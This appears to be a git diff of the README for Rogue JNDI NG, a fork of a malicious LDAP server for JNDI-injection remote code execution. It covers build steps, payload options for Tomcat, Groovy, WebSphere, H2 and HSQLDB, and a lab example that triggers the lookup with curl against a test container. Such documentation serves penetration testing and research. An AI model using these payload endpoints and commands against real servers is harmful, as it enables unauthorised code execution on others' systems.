@@ -1,102 +1,108 @@
-## Rogue JNDI
-A malicious LDAP server for JNDI injection attacks.
+# ROGUE JNDI NG
+<img src="resources/logo.webp" alt="A bug sitting on top of a Stormtrooper helmet" height="640" width="640" style="border-radius: 14%; overflow: hidden;">
 
-### Description
-The project contains LDAP & HTTP servers for exploiting insecure-by-default Java JNDI API.<br> 
-In order to perform an attack, you can start these servers locally and then trigger a JNDI resolution on the vulnerable client, e.g.:
-```java
-InitialContext.doLookup("ldap://your_server.com:1389/o=reference");
+A modern fork of [Rogue JNDI](https://github.com/artsploit/rogue-jndi), which is "a malicious LDAP server for JNDI injection attacks".
+
+## Description
+Rogue JNDI is a great tool in the realm of JNDI exploitation. Our fork adds many features in order to keep it relevant for modern Java environments.
+
+You can read about the full extent of our improvements in our [blog post](https://mogwailabs.de/en/blog/2024/12/jndi-mind-tricks/), but here's a summary:
++ Support for Tomcat version >=10
++ Support for Java version >= 15
++ Users can provide whole script files instead of single OS commands
++ Endpoint for serving generic deserialization payloads
++ New endpoint for exploiting H2 
++ New endpoint for exploiting HSQLDB
++ The usage of [Testcontainers](https://github.com/testcontainers/testcontainers-java) for integration tests (also useful for manual testing, e.g. custom scripting payloads)
+
+> [!NOTE]
+> For a general overview, please refer to the original [README](https://github.com/artsploit/rogue-jndi/blob/master/README.md)
+
+## Building
+The project uses Maven and can be build with something like:
+```shell
+mvn clean package
 ```
-It will initiate a connection from the vulnerable client to the local LDAP server.
-Then, the local server responds with a malicious entry containing one of the payloads, that can be useful to achieve a Remote Code Execution. 
+This creates a `/target` folder where the `RogueJNDI-X.X.X.jar` file resides. 
 
-### Motivation
-In addition to the known JNDI attack methods(via remote classloading in references), this tool brings new attack vectors by leveraging the power of [ObjectFactories](https://docs.oracle.com/javase/8/docs/api/javax/naming/spi/ObjectFactory.html).
-
-### Supported payloads
-* [RemoteReference.java](/src/main/java/artsploit/controllers/RemoteReference.java) - classic JNDI attack, leads to RCE via remote classloading, works up to jdk8u191 
-* [Tomcat.java](/src/main/java/artsploit/controllers/Tomcat.java) - leads to RCE via unsafe reflection in **org.apache.naming.factory.BeanFactory** 
-* [Groovy.java](/src/main/java/artsploit/controllers/Groovy.java) - leads to RCE via unsafe reflection in **org.apache.naming.factory.BeanFactory** + **groovy.lang.GroovyShell**
-* [WebSphere1.java](/src/main/java/artsploit/controllers/WebSphere1.java) - leads to OOB XXE in **com.ibm.ws.webservices.engine.client.ServiceFactory**
-* [WebSphere2.java](/src/main/java/artsploit/controllers/WebSphere2.java) - leads to RCE via classpath manipulation in **com.ibm.ws.client.applicationclient.ClientJ2CCFFactory**
-
-### Usage
+## Usage
+After building, you can run the following command to see all the options:
 ```
-$ java -jar target/RogueJndi-1.0.jar -h
-+-+-+-+-+-+-+-+-+-+
-|R|o|g|u|e|J|n|d|i|
-+-+-+-+-+-+-+-+-+-+
+$ java -jar target/RogueJndi-1.1.jar -h
+        __________ ________    ________ ____ ______________      ____._______  ________  .___   _______    ________ 
+        \______   \\_____  \  /  _____/|    |   \_   _____/     |    |\      \ \______ \ |   |  \      \  /  _____/ 
+         |       _/ /   |   \/   \  ___|    |   /|    __)_      |    |/   |   \ |    |  \|   |  /   |   \/   \  ___ 
+         |    |   \/    |    \    \_\  \    |  / |        \ /\__|    /    |    \|    `   \   | /    |    \    \_\  \
+         |____|_  /\_______  /\______  /______/ /_______  / \________\____|__  /_______  /___| \____|__  /\______  /
+                \/         \/        \/                 \/                   \/        \/              \/        \/
+
+
 Usage: java -jar target/RogueJndi-1.0.jar [options]
   Options:
-    -c, --command     Command to execute on the target server (default: touch 
-                      /usr/local/tomcat/temp/pwn.txt) 
-    -n, --hostname    Local HTTP server hostname (required for remote 
-                      classloading and websphere payloads) (default: 
-                      192.168.0.166) 
-    -l, --ldapPort    Ldap bind port (default: 1389)
-    -p, --httpPort    Http bind port (default: 8000)
-    --wsdl            [websphere1 payload option] WSDL file with XXE payload 
-                      (default: /list.wsdl)
-    --localjar        [websphere2 payload option] Local jar file to load (this 
-                      file should be located on the remote server) (default: 
-                      ../../../../../tmp/jar_cache7808167489549525095.tmp) 
-    --h2              [H2 database init script file (default: /h2)
-    --js-payload-path     [Tomcat Nashorn payload option] Path to a .js file 
-                          containing the payload served by the Tomcat 
-                          controllers; overwrites the -c option (default: 
-                          <empty string>)
-    --groovy-payload-path [Groovy payload option] Path to a .groovy file 
-                          containing the payload served by the Groovy 
-                          controller, overwrites the -c option (default: 
-                          <empty string>)
-    -h, --help            Show this help
-```
-The most important parameters are the ldap server hostname (-n, should be accessible from the target) and the command you want to execute on the target server (-c).
- 
-As an alternative to the "-c" option, you can modify the [ExportObject.java](/src/main/java/artsploit/ExportObject.java) file by putting java code you want to execute on the target server. 
-
-### Example:
-```
-$ java -jar target/RogueJndi-1.1.jar --command "nslookup your_dns_sever.com" --hostname "192.168.1.10"
-+-+-+-+-+-+-+-+-+-+
-|R|o|g|u|e|J|n|d|i|
-+-+-+-+-+-+-+-+-+-+
-Starting HTTP server on 0.0.0.0:8000
-Starting LDAP server on 0.0.0.0:1389
-Mapping ldap://192.168.0.166:1389/o=h2 to artsploit.controllers.H2
-Mapping ldap://192.168.0.166:1389/o=tomcat to artsploit.controllers.Tomcat
-Mapping ldap://192.168.0.166:1389/o=tomcat10 to artsploit.controllers.Tomcat10
-Mapping ldap://192.168.0.166:1389/o=hsqldb to artsploit.controllers.HSQLDB
-Mapping ldap://192.168.0.166:1389/o=websphere2 to artsploit.controllers.WebSphere2
-Mapping ldap://192.168.0.166:1389/o=websphere2,jar=* to artsploit.controllers.WebSphere2
-Mapping ldap://192.168.0.166:1389/o=tomcat10-jshell to artsploit.controllers.Tomcat10JShell
-Mapping ldap://192.168.0.166:1389/o=groovy to artsploit.controllers.Groovy
-Mapping ldap://192.168.0.166:1389/o=tomcat-jshell to artsploit.controllers.TomcatJShell
-Mapping ldap://192.168.0.166:1389/ to artsploit.controllers.RemoteReference
-Mapping ldap://192.168.0.166:1389/o=reference to artsploit.controllers.RemoteReference
-Mapping ldap://192.168.0.166:1389/o=websphere1 to artsploit.controllers.WebSphere1
-Mapping ldap://192.168.0.166:1389/o=websphere1,wsdl=* to artsploit.controllers.WebSphere1
-Mapping ldap://192.168.0.166:1389/o=generic to artsploit.controllers.Generic
+    -c, --command          Command to execute on the target server (default: 
+                           touch /usr/local/tomcat/temp/pwn.txt)
+    -n, --hostname         Local HTTP server hostname (required for remote 
+                           classloading and websphere payloads) (default: 
+                           127.0.0.1) 
+    -l, --ldapPort         Ldap bind port (default: 1389)
+    -p, --httpPort         Http bind port (default: 8000)
+    --wsdl                 [websphere1 payload option] WSDL file with XXE 
+                           payload (default: /list.wsdl)
+    --localjar             [websphere2 payload option] Local jar file to load 
+                           (this file should be located on the remote server) 
+                           (default: 
+                           ../../../../../tmp/jar_cache7808167489549525095.tmp) 
+    --h2                   [H2 database init script file (default: /h2)
+    --js-payload-path      [Tomcat Nashorn payload option] Path to a .js file 
+                           containing the payload served by the Tomcat 
+                           controllers; overwrites the -c option (default: 
+                           <empty string>)
+    --jshell-payload-path  [Tomcat JShell payload option] Path to a .java file 
+                           containing the payload served by the Tomcat 
+                           controllers; overwrites the -c option (default: 
+                           <empty string>)
+    --groovy-payload-path  [Groovy payload option] Path to a .groovy file 
+                           containing the payload served by the Groovy 
+                           controller, overwrites the -c option (default: 
+                           <empty string>)
+    --generic-payload-path [Generic controller option] Path to a file 
+                           containing a serialized object served by the 
+                           Generic controller, overwrites the -c option 
+                           (default: <empty string>)
+    --jdbc-url             [HSQLDB controller option] JDBC URL pointing to an 
+                           HSQL database (default: <empty string>)
+    -h, --help             Show this help
 ```
 
-### Building
-Java v1.7+ and Maven v3+ required
+## Example usage with custom JShell script.
+First, start the test container:
+```shell
+docker run -it -p 8080:8080 ghcr.io/thegebirge/jndi-outcast/tomcat-10-jshell:latest
 ```
-mvn package
+
+After cloning and building the project, start the server:
+```shell
+java -jar target/RogueJndi-1.1.jar --jshell-payload-path "/path/to/cloned/repo/rogue-jndi-ng/src/main/resources/payload.java"
 ```
 
-### Disclamer
-This software is provided solely for educational purposes and/or for testing systems which the user has prior permission to attack.
+Now you only need to make a request to the vulnerable servlet inside the container:
 
-### Special Thanks
-* [Alvaro Muñoz](https://twitter.com/pwntester) and [Oleksandr Mirosh](https://twitter.com/olekmirosh) for the excellent [whitepaper](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf) on JNDI attacks
-* [@zerothoughts](https://github.com/zerothoughts) for the inspirational [spring-jndi](https://github.com/zerothoughts/spring-jndi) repository
-* [Moritz Bechler](https://github.com/zerothoughts) for the eminent [marshallsec](https://github.com/mbechler/marshalsec) research
-* [Orange Tsai](https://twitter.com/orange_8361) and [Welk1n](https://github.com/welk1n) for the Apache + Groovy gadget
+```shell
+curl "http://localhost:8080/tomcat-10-jshell-1.0-SNAPSHOT/lookup?resource=ldap://host.docker.internal:1389/o=tomcat10-jshell"
+```
 
-### Links
-* An article about [Exploiting JNDI Injections in Java](https://www.veracode.com/blog/research/exploiting-jndi-injections-java) in the Veracode Blog
-* [How I Hacked Facebook Again! Unauthenticated RCE on MobileIron MDM](https://blog.orange.tw/2020/09/how-i-hacked-facebook-again-mobileiron-mdm-rce.html) 
+## Demo
+This demo uses our example JShell payload (`/src/main/resources/payload.java`):
 
-### Authors
-[Michael Stepankin](https://twitter.com/artsploit)
+## Resources and Acknowledgements
++ Michael Stepankin for creating the original Rogue JNDI
++ His article about JNDI exploitation:
+  https://www.veracode.com/blog/research/exploiting-jndi-injections-java
++ BlackHat talk of Alvaro Muñoz and Oleksandr Mirosh:
+  https://www.youtube.com/watch?v=Y8a5nB-vy78
++ Their BlackHat paper:
+  https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf
++ Article that includes a rough timeline of JDNI vulnerabilities by Moritz Bechler:
+  https://mbechler.github.io/2021/12/10/PSA_Log4Shell_JNDI_Injection
++ Our previous article about Java 17 deserialization:
+  https://mogwailabs.de/en/blog/2023/04/look-mama-no-templatesimpl
